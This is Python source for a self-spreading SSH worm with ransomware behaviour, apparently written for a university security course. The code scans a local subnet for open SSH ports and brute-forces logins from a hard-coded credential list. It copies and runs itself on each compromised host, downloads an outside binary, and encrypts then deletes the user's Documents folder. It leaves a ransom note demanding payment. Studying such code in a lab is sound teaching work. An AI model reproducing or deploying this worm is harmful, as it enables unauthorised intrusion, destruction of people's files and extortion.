import socket, fcntl, struct  #get ip 
import netifaces  #get ip
import nmap # host scan
import paramiko  ## following  lib for attackSys and tryCred 
import sys
import os
import time
import urllib ##download.py
from subprocess import call ## runprog.py
import tarfile ##maketar.py
import shutil ## delete.py 
#import netinfo 

##mini dict attack
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu','123456')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	##first get all network intergaces on system
	networkInterfaces = netifaces.interfaces()
	##ip address 
	ipAddr = None
	##go through interfaces
	for netFace in networkInterfaces:
	
	##the IP address of the interface 
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
	
	## get ip addr
		if not addr == "127.0.0.1":
			ipAddr = addr
			break 
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	
	return ipAddr 
	

	
	
	
	
#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	##create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	##scan the network for systems whose port is 22
	## is open(maybe SSH running)
	portScanner.scan('192.168.1.0/24', arguments = '-p 22 --open')
	
	##scan the network for host
	hostInfo = portScanner.all_hosts()
	
	## List of hose that are up..
	liveHosts = [] 
	
	##go through and remove non running hose w/ nmap
	for host in hostInfo:
		## host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	##pass
	return liveHosts 

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	##dont have to return attacksystem will return
	##verify =()
	## code from class worm
	##ssh = paramiko.SSHCient()
	##ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		sshClient.connect(host, username= userName,password= password)
		value = 0
	except paramiko.SSHException:
		value = 1 
	except socket.error:
		value = 3
	
	#except socket.error as serr:
	#	if serr.errno != errno.ECONNREFUSED:
	#		raise serr 
	## These are commands to prep for execution
	##sftpClient = ssh.open_sftp()
	##sftpClient.put("payload.py","/tmp" +"payload.py")
	##execute code
	##sftpClient.exec_command("python /tmp/payload.py")
	#dont have to retrun attack sys will return 
	##verify.append(host, userName, password, sshClient)
	return value 

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	##Define tuple 
	cred = () 
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		print username
		print password
		if tryCredentials(host, username, password, ssh) == 0:
			cred = (ssh,username,password)
	
	if cred == (): 
		print("Could not find working cred")
		cred = None 
	
	return cred 
			
			
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		##pass	
			
	# Could not find working credentials
	##return None	
	

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	path = "/tmp/"
	name = "infected.txt"
	for root, dirs, files in os.walk(path):
		if name in files:
			return True
		else:
			return False
	
	##pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	f = open( "/tmp/infected.txt", "w")

	f.write(" You are infected monsieur. c'est la vie.")
	f.close()

def extorterLetter():	
	f = open( "/home/ubuntu/Desktop/Extortion.txt", "w")

	f.write(" You are infected monsieur. c'est la vie.")
	f.write("Send me ONE BILLION $ If you want your sweet files back")
	f.close()
	pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	
	##mark as infected
	markInfected()
	## These are commands to prep for execution
	sftpClient = sshClient.open_sftp()
	sftpClient.put("/tmp/extorter_worm.py","/tmp/" +"extorter_worm.py")
	#sftpClient.chmod ("/tmp/extorter_worm.py", 0777)
	##execute code
	sshClient.exec_command("python /tmp/extorter_worm.py 2>  /tmp/log.txt")
	#time.sleep(20)  not required but not give it time to spread 
	pass
	
##Here comes the pain
attackerIP = '192.168.1.6'
if len(sys.argv) < 2:
	##not in attacker
	if isInfectedSystem():
		print "already infected"
		exit()
	else: 
		#release extorter worm on remote system
		##extorter execute
		##first download ssl 
		urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
		
		# Open the specified archive file (e.g. exdir.tar).
		# If the archive does not already exit, create it.
		tar = tarfile.open("Documents.tar", "w:gz")

		# Add the exdir/ directory to the archive
		tar.add("/home/ubuntu/Documents/")

		# Close the archive file
		tar.close()
		
		# The following is an example which makes
		# program openssl executable once you download
		# it from the web. The code that follows is 
		# equivalent to running chmod a+x openssl
		# from the shell command line. 
		# The format is <command name>, <ARG1>, <ARG2>,
		# ..., <ARGN> where each ARGi is an argument. 
		call(["chmod", "a+x", "./openssl"])
		
		# The code below is equivalent to running line:
		# openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc
		# from the shell prompt. 
		# You do not need to understand the details of how
		# this program works. Basically, "runprog.py" is the
		# input file to the program which we would like to
		# encrypt, "runprog.py.enc" is the output file 
		# containing encrypted contents of file 
		# "runprog.py.enc" and "pass" is the password.
		call(["/usr/bin/openssl", "aes-256-cbc", "-a", "-salt", "-in", "Documents.tar", "-out", "Documents.tar.enc", "-k", "cs456worm"])
	
	
		shutil.rmtree('/home/ubuntu/Documents/')
		os.remove('/home/ubuntu/Documents.tar') 
		extorterLetter()
		
		
networkHosts = getHostsOnTheSameNetwork()	

myIP = getMyIP(networkHosts)

if myIP == attackerIP:
	networkHosts.remove(myIP)
else:
	networkHosts.remove(myIP)
	networkHosts.remove(attackerIP)

print "Found hosts:", networkHosts


	
##go through network hosts 
for host in networkHosts:
	
##try to attack this host
	sshInfo = attackSystem(host)
	print sshInfo
	if sshInfo:
		sshEx = sshInfo[0]
		sftp = sshEx.open_sftp()
		print "Trying to spread"
		try:
			remotepath = '/tmp/infected.txt'
			sftp.stat(remotepath)
			print "already infected yo"
		
		except IOError:
			print "This system should be infected"
			spreadAndExecute(sshInfo[0])
			print "spreading complete"
			exit()

